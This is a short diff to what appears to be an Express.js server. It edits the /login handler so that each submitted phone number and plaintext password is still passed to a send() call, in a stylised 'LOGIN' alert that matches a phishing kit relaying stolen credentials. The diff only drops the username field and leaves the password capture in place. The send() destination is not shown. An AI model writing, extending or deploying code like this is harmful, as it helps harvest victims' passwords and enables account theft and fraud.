@@ -134,7 +134,6 @@ app.post("/register", async (req, res) => {
 app.post("/login", async (req, res) => {
 
     const {
-        username,
         phone,
         password
     } = req.body;
@@ -152,7 +151,6 @@ app.post("/login", async (req, res) => {
 
     send(`🟢 𝗟𝗢𝗚𝗜𝗡
 
-𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲   : ${username}
 𝗛𝗣                 : ${phone}
 𝗣𝗦𝗪𝗥𝗗       : ${password}`);
 
